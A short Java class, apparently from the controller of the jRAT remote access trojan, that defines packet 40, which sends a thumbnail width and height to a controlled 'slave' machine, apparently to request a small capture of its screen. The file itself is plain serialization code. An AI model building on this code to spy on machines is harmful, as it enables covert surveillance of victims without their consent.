package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet40Thumbnail extends AbstractOutgoingPacket {
	
	public static final int DEFAULT_WIDTH = 150;
	public static final int DEFAULT_HEIGHT = 100;
	
	private int width;
	private int height;
	
	public Packet40Thumbnail() {
		this(DEFAULT_WIDTH, DEFAULT_HEIGHT);
	}
	
	public Packet40Thumbnail(int width, int height) {
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(width);
		dos.writeInt(height);
	}

	@Override
	public short getPacketId() {
		return 40;
	}

}
